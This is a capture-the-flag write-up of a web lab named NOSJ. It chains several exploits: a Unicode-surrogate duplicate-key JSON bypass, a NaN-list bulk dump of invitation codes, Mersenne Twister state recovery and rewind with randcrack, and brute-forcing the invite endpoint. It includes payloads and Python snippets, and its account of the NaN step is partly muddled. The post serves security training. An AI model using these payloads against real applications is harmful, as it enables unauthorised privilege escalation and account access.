# FlagYard CTF — NOSJ

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) · **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) · **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) · **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** SAFCSP
- **Category:** Web
- **Difficulty:** Insane (جنوني)

> *"Welcome to our E-commerce website, I wish you enjoy the journey."*
> — First Man Standing

---

## The short version

This whole thing is a chain of small, boring-looking bugs that add up to a flag:

1. A **Unicode trick** lets us become an *activated seller* even though the app blocks `activated: true`.
2. A **NaN trick** in the invitation endpoint lets us dump hundreds of invitation codes at once.
3. The codes turn out to be **Mersenne Twister** output — a *non-secure* PRNG.
4. With 800 codes in hand we **recover the PRNG state**, then **rewind** it to get older codes.
5. One of those older codes was the *real* buyer's invitation — and submitting it opens the store.

**Flag:** `FlagY{5925aa0a365d465f47f362006c44eee3}`

---

## First look at the app

The site is a small e-commerce demo with two kinds of users:

- **Buyer** — you can't do anything useful until you have a valid *invitation code*. That code opens the store, and the store holds the flag.
- **Seller** — the one who *generates* buyer invitation codes.

Naturally, the plan writes itself: become a seller, mint ourselves a valid invitation, register as a buyer, submit it, done. Easy, right? Not quite.

The interesting routes:

| Method | Path | Purpose |
|---|---|---|
| GET/POST | `/register/seller` | seller registration (JSON) |
| POST | `/login/seller` | seller login |
| GET | `/seller/dashboard` | seller panel |
| POST | `/get_buyer_invitation` | generates invitation codes |
| POST | `/register/buyer` | buyer registration |
| POST | `/login/buyer` | buyer login |
| POST | `/buyer/invite` | submits an invitation code |

---

## Trick 1: becoming an "activated" seller

Signing up as a seller sends JSON like:

```json
{
  "username": "me",
  "password": "pass",
  "bio": "short bio",
  "activated": true
}
```

And the server immediately tells me off:

```
403  You cannot set 'activated' to true.
```

Wait — I didn't expect there to even *be* an `activated` field. Now that I know it exists, the goal is obvious: get the app to treat my seller as active. But it validates `activated` as a boolean and refuses `true`.

The bypass is a famous little thing called a **Unicode truncation / duplicate-keys** bug. Here's the idea in plain words:

- The schema validator and the application don't always "see" the same JSON keys.
- If I append a **lone high surrogate** like `\udb88` to a key, it gets silently dropped during string handling/truncation.
- So `"activated"` and `"activated\udb88"` are *two different keys* for the validator… but they become the *same key* for the application after truncation.

And because the validator and the app both keep the *last* duplicate they see:

```json
{
  "username": "me",
  "password": "pass",
  "bio": "short bio",
  "activated": false,
  "activated\udb88": true
}
```

- The **schema** validates `"activated": false` → passes ✅
- The **application** stores `"activated" = true` (last key wins after the surrogate is dropped) ✅

In Python, crafting that key is just:

```python
key2 = "activated" + "\udb88"
body = {"username": u, "password": "pw", "bio": "x",
        "activated": False, key2: True}
```

And sure enough — the seller account is created **active**. Login works, dashboard unlocks.

> Why not just send two `"activated"` keys? Because modern JSON parsers collapse them and the validator would still see `true` and complain. The surrogate is the magic ingredient that makes the two sides disagree.

---

## Trick 2: dumping invitation codes with a wall of NaNs

The seller dashboard has a tiny "Generate Invitation" form. Burp shows it POSTing a JSON name:

```json
POST /get_buyer_invitation
{"name": "some_buyer"}
```

…and it replies with a single invitation code.

But the endpoint actually accepts a **list** of names. And when that list is full of repeated values, it happily returns **one code per element**. Repeated values collapse into a single key in the response — and the trick to make them collapse the "wrong" way is to repeat `NaN`:

```json
{"name": [NaN, NaN, NaN, NaN, NaN, NaN]}
```

Boom — six codes in one shot. Scale it up:

```json
{"name": [NaN, NaN, ... 800 NaNs ...]}
```

and I get **800 sequential invitation codes** in a single request. Suddenly the "generate one invitation" feature is a bulk code dump.

---

## Trick 3: these "random" codes aren't random

I tried submitting the dumped codes one by one as a buyer. Nothing. Dead end after dead end.

But staring at the dump, some patterns start to nag:

- Every request returns exactly **800** codes.
- For a given instance the codes are **identical and sequential** — same dump, same values.
- Every single value fits in `0 .. 2^32-1` — a full unsigned 32-bit integer.

That's not randomness. That's a *seeded, deterministic* generator. And given the hint…

> *"Welcome to our E-commerce website, I wish you enjoy the journey."*
> — First Man Standing

…it's pretty clearly the **Mersenne Twister**:

```python
import random
code = str(random.getrandbits(32))
```

---

## Trick 4: breaking MT19937 and traveling back in time

The Mersenne Twister is a beautiful, fast generator — and a terrible choice for anything security-related. The moment you see **624 consecutive 32-bit outputs**, its entire internal state is public. From there you can predict both the **future** and the **past**.

Luckily I have *800* outputs.

Using `randcrack`:

```python
from randcrack import RandCrack

rc = RandCrack()
for v in dumped_outputs[:624]:       # 624 outputs → recover state
    rc.submit(v)

pred = [rc.predict_getrandbits(32) for _ in range(len(dumped) - 624)]
assert pred == dumped[624:]          # future outputs match → confirmed ✅
```

In my run, **176 out of 176** predicted values matched the remaining dump. The stream is 100% plain MT19937.

But here's the thing — the valid invitation code that opens the store is **older** than my dump window. It was generated when the real buyer account was created, before I ever logged in. So knowing the state isn't enough; I need to *rewind*.

RandCrack has an `offset()` for exactly that. After submitting 624 outputs, the cursor sits at stream index `624`. To jump back 800 positions and re-read them:

```python
rc.offset(-(624 + 800))
prev = [rc.predict_getrandbits(32) for _ in range(800)]
```

That's 800 codes from **before** my dump window. Somewhere in there is the invitation I actually need.

---

## Trick 5: the flag (finally)

New buyer account, quick login, then walk the candidates — the 800 rewound codes plus the 800 dumped ones — and POST each to the invite endpoint:

```python
POST /buyer/invite
{"invitation": "2643420079"}
```

- Wrong code → `400 Invalid invitation code.`
- Right code → `200` and the store opens.

After **787 candidates** — right at rewound-index ~786, i.e. about **14 outputs before my dump window** (which is *exactly* where the PRNG math predicted the valid code should be) — the response changed:

```
Your flag is: FlagY{5925aa0a365d465f47f362006c44eee3}
```

---

## What actually went wrong (the root causes)

| Bug | Location | Impact |
|---|---|---|
| Unicode truncation + duplicate JSON keys | seller `activated` field | attacker controls seller activation |
| Repeated-key NaN handling | `/get_buyer_invitation` name list | attacker mass-dumps invitation codes |
| Using `random` for invitations | code generation | state fully recoverable from 624 outputs |
| All invitations from one global stream | code generation | past codes recoverable via rewind |

---

## Takeaways

- **Never use `random` (`Mersenne Twister`) for security.** A single 624-value leak is game over. Reach for `secrets` or `SystemRandom`.
- Duplicate-key JSON bugs aren't only about *which* parser wins — **character truncation/normalization** can make "different" keys collide in the app while the validator still sees them as separate.
- When a server hands you long runs of sequential bounded integers, your first question should be: *"is this a PRNG?"* Because if it's MT19937, you've just been given the key to the whole castle.
- Always probe whether a "single value" endpoint accepts **lists**. Sometimes the feature is bigger than its UI suggests.

---

## Credits

A huge shout-out to **Dr.kasbr**, whose original writeup confirmed the whole PRNG-rewind direction when I was stuck on the "submit the first code" idea. This solve reproduces the same journey end-to-end — with our own flag.

*I wish you enjoy the journey.* — First Man Standing 🏁